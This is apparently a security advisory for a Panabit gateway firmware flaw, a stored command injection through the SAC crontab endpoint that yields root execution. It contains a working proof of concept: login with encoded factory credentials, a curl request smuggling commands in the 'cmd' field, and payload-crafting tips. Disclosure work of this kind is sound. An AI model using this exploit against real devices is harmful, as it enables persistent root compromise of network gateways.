# Panabit Smart Application Gateway

- Vendor: Beijing Panabit Software Co., Ltd. (Panabit)
- Product: Panabit Smart Application Gateway / Internet Behavior Management (PanabitFREE edition; same-source SMB/OEM/MGW series)
- Firmware Version: TANGr7p10 (`PanabitFREE_TANGr7p10_20260817_Linux3`, built 2026-08-17, x86-64)
- Vulnerability Type: Post-authentication second-order (stored) code injection → persistent root RCE (CWE-94 / CWE-78)

## Overview

In Panabit's SAC (centralized wireless-AP management) module, the shell CGI `sac/ajax_sac_crontab` (`action=add_crontab`) writes the request parameters `cmd` (and `month`/`day`/`hour`/`min`, etc.) **verbatim into the persistent configuration `${PGETC}/App/sac/crontab.conf`, with no escaping and no whitelist** (`ajax_sac_crontab:38`). The **root resident daemon** `app/webui/bin/sac_crontab` then reads that configuration back every 50 seconds and runs `eval "sch_${val}"` (`sac_crontab:131`) on **every whitespace-separated field** of each line — a **second-pass shell parse** of attacker-controlled text. `eval` is a parse boundary: ordinary variable expansion does not re-parse metacharacters, `eval` does. Hence the injected `cmd=x=1;id>/tmp/…;#` turns `;` into a genuine command separator, **executing arbitrary commands as root**; the configuration lives in a persistent directory, so it is expected to be re-read after a reboot (delay ≤50 s; reboot persistence was not exercised in emulation):

`curl -sk -b COOKIE 'https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_crontab' --data-urlencode 'action=add_crontab' --data-urlencode 'month=day' --data-urlencode 'day=1' --data-urlencode 'hour=99' --data-urlencode 'min=99' --data-urlencode 'cmd=x=1;id>/tmp/qtest/CRONRCE;echo${IFS}CRON-RCE-OK>/tmp/qtest/CRONRCE2;#'`

The endpoint only requires a valid management session (httpd's Cookie gate on `/cgi-bin/**`); the write side validates nothing — a pure blind write.

## Vulnerability Details

The bug is **two-stage**: the write side only lands the configuration; the actual execution happens in a separate root daemon.

**Write side** (`admin/cgi-bin/sac/ajax_sac_crontab`, `#!/bin/sh`, line 38):

```sh
    38:	echo "id=${id} month=${CGI_month} day=${CGI_day} hour=${CGI_hour} min=${CGI_min} cmd=${CGI_cmd} cmdstr=${cmdstr} apid=${CGI_apid} apmac=${CGI_apmac} birth=`date +%s`" >> ${CRONTAB_CONF}
```

`${CGI_cmd}` enters the configuration line with no validation and no escaping; `;` `#` `>` `$` `{` `}` land on disk verbatim (`cmdstr` is quoted only in the `ssid_rmv` branch — **the `cmd` branch never is**).

**Read side** (`app/webui/bin/sac_crontab`, root resident, lines 114–133):

```sh
   114:	cat ${CRONTAB_CONF} | while read line
   128:	      for val in ${line}
   130:	      if [[ ! "$val" =~ "hour" ]] && [[ ! "$val" =~ "min" ]];then
   131:	              eval "sch_${val}"
   132:		  fi
```

It runs `eval "sch_${val}"` on every whitespace-separated field of each line. The injected `cmd=x=1;id>/tmp/X;#` makes `val` equal to `cmd=x=1;id>/tmp/X;#`, so:

* Line on disk: `id=1 month=day day=1 hour=99 min=99 cmd=x=1;id>/tmp/X;# cmdstr= apid= apmac= birth=…`
* Enters `eval "sch_cmd=x=1;id>/tmp/X;#"` → parsed as `sch_cmd=x=1` ; `id>/tmp/X` ; `#` (commenting out the remainder)
* ⇒ **executes `id>/tmp/X` as root**.

**Three pitfalls (must be stated clearly)**:

1. **The payload must not contain quotes**: the trailing `"` of `eval "sch_${val}"` is supplied by the **outer** wrapper; one `"` inside `val` makes the eval string have an odd number of quotes → `unexpected EOF while looking for matching '"'` and the whole eval fails. The correct approach is **no quotes at all**: chain commands with a bare `;` and redirect with a bare `>` (`;` `#` `>` are all bare metacharacters inside the eval string; nothing needs to be closed).
2. **Use `${IFS}` instead of spaces**: `for val in ${line}` splits on whitespace, so a literal space in the payload would break the field; `${IFS}` plays the role of the space (`echo${IFS}CRON-RCE-OK>/tmp/qtest/CRONRCE2`), or `cp` replaces `>` (`cp${IFS}/etc/PG.conf${IFS}/tmp/qtest/CRONRCE3`).
3. **Must be started with `bash` explicitly**: `sac_crontab` declares `#!/bin/sh` but uses bash syntax (`[[ ]]` / `arr=()` / `${var//,/ }`); under dash it fails with `Syntax error: "(" unexpected (expecting "done")`. For payout, run `timeout 70 bash $R/app/webui/bin/sac_crontab …`. Whether `/bin/sh` on a real device is bash-compatible was not verified.
4. **Must run as root (`sudo`)**: the daemon's `eval` produces `id>/tmp/qtest/CRONRCE`, which writes into `/tmp/qtest`; that directory is root-owned, so running without root gives `Permission denied` and no marker file appears. Use `sudo timeout 70 bash …` for payout (on real hardware `sac_crontab` is a root-resident daemon).

## Proof of Concept

**Prerequisite**: set up the environment on the analysis host 192.168.35.137 (symlink `/usr/ramdisk` + `/etc/PG.conf` + `ipe_httpd -C httpd.conf`, HTTPS 18443, `user=root`).

**Step 1 — log in to obtain a session Cookie** (factory credentials admin/panabit, esctool-encoded 32-hex):

```bash
CK=$(curl -sk -i -X POST https://127.0.0.1:18443/login/user.cgi \
  -d 'action=local_login&palang=ch' \
  -d 'username=590b62dd4a42161f3bcfa16e2baf6b33' \
  -d 'password=ee5c4080bbe094ffb47a84b32b8cabd8' \
  | tr -d '\r' | grep -i '^set-cookie:' | sed 's/^[Ss]et-[Cc]ookie: //; s/;.*//')
echo "$CK"
```

**Step 2 — inject the command** (post-auth):

```bash
curl -sk -i -b "$CK" 'https://127.0.0.1:18443/cgi-bin/sac/ajax_sac_crontab' \
  --data-urlencode 'action=add_crontab' \
  --data-urlencode 'month=day' --data-urlencode 'day=1' \
  --data-urlencode 'hour=99' --data-urlencode 'min=99' \
  --data-urlencode 'cmd=x=1;id>/tmp/qtest/CRONRCE;echo${IFS}CRON-RCE-OK>/tmp/qtest/CRONRCE2;#'
```

Response: `HTTP/1.0 200 OK` + `{ "code": 0, "msg": "成功", "data": "" }`, and the payload lands verbatim in `${PGETC}/App/sac/crontab.conf`.

**Step 3 — start the root daemon to trigger the payout** (write and execution are decoupled, ≤50 s; **must use sudo**):

```bash
# define the firmware path first (if not already defined)
R=/path/to/PanabitFREE_TANGr7p10_20260817_Linux3

# start the root daemon with sudo (it must run as root to write into root-owned /tmp/qtest)
sudo timeout 70 bash $R/app/webui/bin/sac_crontab > /dev/null 2>&1
```

Expected: `daemon_rc=124` (killed by timeout = normal daemon behavior); then `/tmp/qtest/CRONRCE` and `/tmp/qtest/CRONRCE2` appear (see "Reproduction Result").

## Impact

An authenticated attacker gains **root command execution**: read/write arbitrary files, change admin passwords, plant backdoors, tamper with traffic policy and audit records, and pivot into the internal network. This is a **second-order + persistent** injection — the configuration lives in the persistent directory `${PGETC}/App/sac/crontab.conf`, so it is expected to be re-read after a reboot (not exercised in emulation), a "does not disappear on reboot" backdoor primitive; writing and execution are decoupled (≤50 s, then repeated every loop), so the attacker **can walk away right after sending the request**.

## Reproduction Result

Verified with the real `ipe_httpd` (HTTPS 18443): after writing `cmd=x=1;id>/tmp/qtest/CRONRCE;echo${IFS}CRON-RCE-OK>/tmp/qtest/CRONRCE2;#`, the vendor's `sac_crontab` daemon was started manually under `bash` (not by the boot sequence):

```
$ cat /tmp/qtest/CRONRCE
uid=0(root) gid=0(root) groups=0(root)

$ cat /tmp/qtest/CRONRCE2
CRON-RCE-OK

$ ls -l /tmp/qtest/CRONRCE /tmp/qtest/CRONRCE2
-rw-r--r-- 1 root root 39 /tmp/qtest/CRONRCE
-rw-r--r-- 1 root root 12 /tmp/qtest/CRONRCE2

```

![image-20261017184255724](.\image-20261017184255724.png)

The injected command executed inside the **root resident daemon**, with output retrievable. Only non-destructive commands (`id` / `echo` / `cp`) were used; no reboot/restore/upgrade was invoked.
